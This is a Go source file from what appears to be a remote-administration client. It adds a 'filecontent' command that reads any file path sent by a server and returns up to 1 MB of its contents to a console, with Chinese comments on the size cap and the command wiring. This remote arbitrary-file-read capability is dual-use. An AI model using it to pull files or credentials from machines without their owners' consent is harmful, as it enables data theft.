package commands

import (
	"fmt"
	"os"
	"strings"
)

// maxFileContentBytes 单次回传上限（控制台查看用）。
// 命令结果会整段进 shell 内容并落库，不设限时一个几 GB 的文件会把回包和库撑爆。
const maxFileContentBytes = 1 << 20 // 1MB

// CmdFileContent 读取文件内容作为命令结果回传（控制台命令 `filecontent <path>`）。
//
// 与 FILE_EDIT_READ(80) 的区别：后者要 requestId，回包走文件编辑队列（供编辑器加载
// 与回写），本命令直接以命令结果回传，供控制台直接查看。
// 服务端 pkg/sendcommand 的 commandTable 把它登记为前缀 "filecontent "（rawArg），
// 因此 cmdBuf 就是路径原文。
//
// 注：命令号 FileContent(19) 在客户端一直存在但从未有 dispatch 分支，
// 服务端下发后客户端一律回 "not supported command: 19" —— 本条修复该断链。
func CmdFileContent(cmdBuf []byte) ([]byte, error) {
	path := strings.TrimSpace(string(cmdBuf))
	if path == "" {
		return nil, fmt.Errorf("用法: filecontent <文件路径>")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("读取失败: %v", err)
	}

	if len(data) > maxFileContentBytes {
		return []byte(fmt.Sprintf("(文件共 %d 字节，仅显示前 %d 字节)\n%s\n...(已截断)",
			len(data), maxFileContentBytes, data[:maxFileContentBytes])), nil
	}
	return data, nil
}
